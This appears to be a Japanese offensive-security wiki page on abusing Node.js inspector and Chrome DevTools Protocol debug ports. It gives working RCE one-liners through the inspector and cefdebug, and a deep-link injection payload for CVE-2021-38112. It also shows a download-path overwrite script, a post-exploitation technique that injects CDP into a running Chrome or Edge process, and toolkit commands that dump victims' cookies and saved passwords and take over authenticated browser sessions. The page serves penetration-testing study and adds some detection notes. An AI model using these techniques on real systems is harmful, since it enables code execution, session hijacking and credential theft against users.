# Node inspector/CEF debug の悪用

{{#include ../../banners/hacktricks-training.md}}

歴史的な実践例として、Multimaster の解説や CVE-2019-1414 の Visual Studio Code debugger 攻撃があります。これらはバージョン固有の参考情報として扱い、現在のすべての Electron や Chromium のターゲットで同じプリミティブが利用できると仮定しないでください。<sup>[[1]](#references)[[3]](#references)</sup>

## 基本情報

[ドキュメントより](https://nodejs.org/learn/getting-started/debugging): `--inspect` スイッチを指定して起動すると、Node.js プロセスはデバッグクライアントからの接続を待ち受けます。**デフォルト**では、ホストとポート **`127.0.0.1:9229`** で待ち受けます。また、各プロセスには**一意の** **UUID** が割り当てられます。<sup>[[4]](#references)</sup>

Inspector クライアントが接続するには、ホストアドレス、ポート、UUIDを把握して指定する必要があります。完全な URL は、`ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` のようになります。<sup>[[4]](#references)</sup>

> [!WARNING]
> **debugger は Node.js の実行環境に完全にアクセスできる**ため、このポートに接続できる悪意ある攻撃者は、Node.js プロセスの権限で任意のコードを実行できる可能性があります（**権限昇格の可能性**）。<sup>[[4]](#references)</sup>

Inspector を起動する方法はいくつかあります。<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

検査対象のプロセスを起動すると、次のようなものが表示されます:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

**CEF**（**Chromium Embedded Framework**）ベースのプロセスでは、`--remote-debugging-port=9222` を指定して debugger を公開できます。これにより、Node.js inspector ではなく [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由でブラウザーが公開されるため、Node.js の `process` ベースの payload は、デフォルトではそのまま適用できません。<sup>[[2]](#references)[[5]](#references)</sup>

debugger を有効にしてブラウザーを起動すると、次のように表示されます。<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### CDP endpointの列挙と操作

HTTP discovery endpointでは、**browser** WebSocketと個々の**target**（タブ、worker、extensionなど）のWebSocketが区別されます。browser endpointには`/json/version`、targetには`/json/list`を照会します。返された`webSocketDebuggerUrl`の値を使って、CDPのJSON-RPC風メッセージを直接送信できます。<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

たとえば、`websocat "$BROWSER_WS"` で接続し、`{"id":1,"method":"Target.getTargets"}` または `{"id":2,"method":"Storage.getCookies"}` を送信します。ページターゲット（`websocat "$PAGE_WS"`）では、`Runtime.evaluate` はその renderer 内で実行され、`Page.captureScreenshot` は base64 エンコードされたスクリーンショットを返します。`document.cookie` では `HttpOnly` cookie を確認できませんが、`Storage.getCookies` はブラウザーの cookie ストアを要求します。<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### ブラウザー、WebSocket、same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webブラウザーで開いたWebサイトは、ブラウザーのセキュリティモデルの下でWebSocketおよびHTTPリクエストを送信できます。**一意なデバッガーセッションIDを取得する**には、**最初のHTTP接続**が必要です。**same-origin-policy**により、Webサイトは**このHTTP接続**を確立できません。[**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**への**追加の対策として、Node.jsは接続の**'Host' headers**が**IP address**または正確に**`localhost`**を指定していることを確認します。<sup>[[4]](#references)</sup>

> [!TIP]
> この**セキュリティ対策により、単にHTTPリクエストを送信するだけで**（SSRFの脆弱性を悪用すれば可能）、コードを実行するために**inspectorを悪用することを防ぎます**。<sup>[[4]](#references)</sup>

### 実行中のプロセスでinspectorを起動する

実行中のnodejsプロセスに**シグナルSIGUSR1**を送信すると、デフォルトポートで**inspectorを起動**できます。ただし、十分な権限が必要です。そのため、これにより**プロセス内の情報への特権アクセス**を得られる可能性はありますが、直接的な権限昇格にはなりません。<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> これはコンテナで役立ちます。プロセスを終了して `--inspect` 付きで新しいプロセスを起動する方法は、プロセスとともに**コンテナ**も**終了させられる**ため、**選択肢になりません**。<sup>[[6]](#references)</sup>

### inspector/debugger に接続する

**Chromium ベースのブラウザー**に接続するには、Chrome または Edge でそれぞれ `chrome://inspect` または `edge://inspect` の URL にアクセスします。Configure ボタンをクリックし、**対象ホストとポート**が正しく一覧に表示されていることを確認します。画像は Remote Code Execution (RCE) の例を示しています。<sup>[[2]](#references)[[4]](#references)</sup>

![デバッガーにアクセスする URL が表示されます。例: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger に接続する: Chromium ベースのブラウザーに接続するには、...](<../../images/image (674).png>)

**コマンドライン**を使って、次のように debugger/inspector に接続できます。<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

ツール[**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)を使うと、ローカルで実行中の**inspectorを検出**し、そこに**コードを注入**できます。<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 経由でブラウザーに接続している場合、**NodeJS RCE exploits は機能しない**ことに注意してください（興味深い使い方を見つけるには、APIを確認する必要があります）。<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS デバッガー/インスペクターでの RCE

> [!TIP]
> [**Electron での XSS から RCE を取得する方法をお探しの場合は、このページを確認してください。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Node の **inspector** に**接続**できる場合に **RCE** を取得する一般的な方法には、次のようなものがあります（**Chrome DevTools protocol への接続では機能しない**ようです）。<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocolのペイロード

APIは[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)で確認できます。<sup>[[5]](#references)</sup>
このセクションでは、このプロトコルを悪用するために使われた興味深い手法をいくつか紹介します。

### Chrome 136以降のデフォルトプロファイル制限

**Chrome 136**以降、Chromeは**デフォルトのChromeデータディレクトリ**を対象にする場合、`--remote-debugging-port`および`--remote-debugging-pipe`を無視します。これらのスイッチを使うには、標準以外の`--user-data-dir`を併せて指定する必要があります。別個の暗号化キーと分離されたブラウザー状態により、単純なフラグ指定の手法でユーザーの通常の認証済みプロファイルが露出するのを防ぎます。このChrome固有の制限が、古いChromeビルド、Chrome for Testing、Electron/CEFアプリケーション、またはその他のChromium派生ブラウザーにも適用されると、検証なしに想定してはいけません。<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

したがって、現在の Chrome プロセスが `--remote-debugging-port` のみを指定して起動されているのを見ても、CDP が有効になった証拠にはなりません。リスナーと `/json/version` を確認し、実際にどのプロファイルが使われているかを特定してください。<sup>[[14]](#references)</sup>

### Deep Link 経由のパラメーターインジェクション

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) では、Rhino Security が、CEF ベースのアプリケーションがシステムにカスタム URI（workspaces://index.html）を**登録し**、その URI 全体を受け取った後、その URI から一部を構築した設定を使って **CEF ベースのアプリケーションを起動していた**ことを発見しました。<sup>[[8]](#references)</sup>

URI パラメーターは URL デコードされ、CEF ベースのアプリケーションの起動に使われていたため、ユーザーはコマンドラインに **`--gpu-launcher`** フラグを**インジェクト**し、任意の処理を実行できることが判明しました。<sup>[[8]](#references)</sup>

そのため、次のようなペイロードが使えます。

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

calc.exe を実行します。<sup>[[8]](#references)</sup>

### ファイルの上書き

**ダウンロードファイルの保存先**フォルダを変更し、ファイルをダウンロードして、よく使われるアプリケーションの**ソースコード**を**悪意のあるコード**で**上書き**します。<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### WebDriver RCEと情報窃取

STAR Labsは、外部に公開されたWebDriver/CDPサービスによって任意ファイルの読み取りやRCEが可能になり、一部の構成ではDNS rebindingによってexploit chainを完成できることを示しました。<sup>[[9]](#references)</sup>

ChromeDriverのWebDriverサービスは、Chrome DevTools/CDPとは別のものです。新しいセッションで起動するブラウザー実行ファイルは、[`goog:chromeOptions.binary` capability](https://developer.chrome.com/docs/chromedriver/capabilities)で指定します。権限のない呼び出し元がrootで実行されているChromeDriverサービスにアクセスでき、呼び出し元が制御する実行ファイルのパスを指定してセッションを作成できる場合、その起動処理によってサービスの権限境界を越えられる可能性があります。`/sessions`が空の応答を返しても、新しいセッションを作成できるかどうかは判断できません。この経路が利用可能だと結論づける前に、プロセスの所有者、実際のリスナーへの到達可能性、セッションの認可、実行ファイルへのアクセス、隔離状態を確認してください。プロセス名や一般的なポート番号だけでは不十分です。[Googleのセキュリティガイダンス](https://developer.chrome.com/docs/chromedriver/security-considerations)では、ChromeDriverを権限のないアカウントで実行するよう推奨しています。パッシブな列挙ではWebDriverセッションを作成しないでください。

ブラウザー自動化とChromiumのセキュリティに関する過去の事例については、Counter WebDriverのwrite-upとProject Zeroのissue 773、1742、1944も参照してください。<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### 稼働中のChromiumプロセス内でCDPを有効化する

Chromeのデフォルトプロファイル制限がブロックするのは、コマンドラインによる有効化経路だけです。ブラウザープロセスを操作するのに十分な同一ユーザー権限があれば、オリジナルの[**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler)とCobalt Strikeの[**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF)は、すでに実行中の`chrome.exe`または`msedge.exe`内で、エクスポートされていないChromiumの`content::DevToolsAgentHost::StartRemoteDebuggingServer`を呼び出します。そのため、エンドポイントは実際のプロファイルに属し、そのタブ、拡張機能、Cookie、認証済み状態を保持します。<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

一般的なx64版Chrome/Edgeプロセスでは、BOFはブラウザーウィンドウと読み込まれた`chrome.dll`/`msedge.dll`を見つけ、リモートPEをマスク付きシグネチャでスキャンし、スタブとコンテキストブロックを割り当て、ウィンドウプロシージャを一時的に置き換えて、ブラウザーの**UI thread**上で最終呼び出しを実行します。必要なランタイム入力は、`StartRemoteDebuggingServer`、Chromiumの`operator new`、`TCPServerSocketFactory::CreateForHttpServer`、およびファクトリーのvtableです。必須シグネチャのいずれかが一意に一致しない場合、実行は停止します。<sup>[[15]](#references)[[16]](#references)</sup>

BOFはブラウザーモードと任意のポートを受け取ります。その後、ヘルパースクリプトでエンドポイントを検証し、Cookieを収集できます。`chrome-iso`は、ChromeのWindows Process Isolation境界に対する別の経路です。<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

`chrome-iso` パスでは、分離プロセスへの query-only handle のみを使用します。実行中のプロセスと PE イメージサイズが一致するインストール済みの `chrome.dll` を特定し、そのローカルイメージからシンボルを解決します。さらに、Chromium の `WindowImpl` dispatch、同期的な `WM_COPYDATA`、既存イメージの User32 hook を利用して UI thread に到達します。<sup>[[16]](#references)</sup>

> [!WARNING]
> これは**侵害後の browser-process manipulation**手法であり、認証を必要としないネットワークバイパスではありません。関連する C++ シンボルが export されておらず、browser の更新後に変更される可能性があるため、ビルドに依存します。<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### browser 更新後の signature の更新

対象にインストールされているバージョンと完全に一致する `chrome.dll` または `msedge.dll` と、それに対応する PDB を使用します。Windows SDK の `symchk.exe` でシンボルをダウンロードできます。続いて、リポジトリのスクリプトで `StartRemoteDebuggingServer` を特定し、allocator/socket-factory の入力を導出するか、BOF に埋め込まれたすべての signature を検証します。<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

zero-hit または multi-hit の結果を、任意のアドレスに置き換えてはいけません。既知の `operator new` または `CreateForHttpServer` のパターンが大きく変わり、新しいマスクのシードとして使えない場合は、`pe_signature_finder.py` を PDB とともに使ってそのシンボルを調べ、対象モジュール内で一意となるバイト列を導き出してください。<sup>[[16]](#references)[[18]](#references)</sup>

#### CDP Toolkit による認証済みブラウザーからの抽出

この手法は、App-Bound Encryption（ABE）をオフラインで復号したり、デバイスバインディングを解除したりするものではありません。代わりに、正規のブラウザーを**復号オラクル兼認証済みインタラクションプロキシ**として扱います。`Storage.getCookies` は稼働中のブラウザーに Cookie ストアの内容を要求し、ナビゲーション／スクリーンキャストのワークフローにより、リクエスト、ストレージ、エンタープライズ認証、デバイスバインド動作が被害者の既存ブラウザー内に維持されます。<sup>[[17]](#references)[[18]](#references)</sup>

ループバック CDP リスナーをオペレーターの pivot 経由でルーティングした後、[**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) を使って一般的なアーティファクトを列挙・収集できます。<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`、`tabs list`、`cookies dump`、`tabs screenshot`は、主に`/json/version`、target list、`Storage.getCookies`、`Page.captureScreenshot`をラップしたものです。一方、履歴、ブックマーク、拡張機能、パスワードのメタデータには、一時的な`chrome://`/`edge://` WebUI targetが必要です。toolkitは画面のレンダリングを待ち、そのモデルまたはDOMを調べて結果を収集し、targetを閉じます。<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump`はさらに踏み込み、実際の保存済みログインのoriginを開き、認証情報フィールドにフォーカスを当て、CDP input eventsを使ってネイティブのautofill候補を選択し、入力された値を読み取ります。origin/port/pathは保存済みパスワードのrealmと厳密に一致させる必要があります。候補ポップアップはブラウザーのネイティブUIであるため、表示モードが確実な既定値です。<sup>[[17]](#references)[[18]](#references)</sup>

リアルタイムの操作では、`browser-takeover screencast`はフレームをストリーミングし、実際のtarget（バックグラウンドモードや画面外モードも含む）に入力を送信します。一方、`browser-takeover proxy`はHTTPとHTTPS `CONNECT`をローカルで受け付け、非表示のChrome target経由で上流へのリクエストを行います。非表示targetが利用できない場合は、バックグラウンドタブにフォールバックします。これにより被害者のネットワーク／認証コンテキストを維持できますが、返されたコンテンツはオペレーター側のブラウザーでレンダリングされるため、複雑なクライアントサイドアプリケーションでは忠実度が低くなります。<sup>[[17]](#references)[[18]](#references)</sup>

検出では、`--remote-debugging-*`のコマンドラインテレメトリだけに頼らないでください。ブラウザープロセスに対する不審なハンドルやメモリ操作（`PROCESS_VM_OPERATION`、`PROCESS_VM_WRITE`、スレッド作成）、DLL injection、Chrome/Edgeが所有する予期しないloopbackリスニングソケットも相関分析してください。<sup>[[15]](#references)</sup>

### Post-Exploitation

実環境で、Chromiumベースのブラウザーを使用しているユーザーのPCを**侵害した後**に行う歴史的な手法として、debuggingを有効にしてブラウザーを再起動し、loopback portを転送する方法がありました。選択したprofileを受け入れる製品／ビルドでは、被害者のブラウジング状態が漏れる可能性があります。ただし、Chrome 136以降では、既定のデータディレクトリに対してこの方法は有効になりません。<sup>[[7]](#references)[[14]](#references)</sup>

元の再起動コマンドは、古いバージョンなど特定の対象向けに以下に残してあります。2つ目のコマンドは現在のChromeでサポートされる形式ですが、被害者の通常の認証済み状態を再度開くのではなく、分離されたprofileを作成します。<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

macOS固有の Chromium の再起動、拡張機能、CDP の tradecraft については、[macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md) を参照してください。



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium のデバッガー検査・exploit ツール](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger 経由の Visual Studio Code リモートコード実行](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - はじめに](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Chrome のデバッグ機能を悪用して、リモートからブラウジングセッションを監視・制御する](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces のリモートコード実行](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding と CDP を介した WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot から RCE へ](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium のバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium のバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium のバグトラッカー)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [セキュリティ向上のためのリモートデバッグスイッチの変更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [実行中の Edge ブラウザーへの CDP のインジェクション: Runtime Browser Instrumentation の詳細解説](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monster の帰還](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
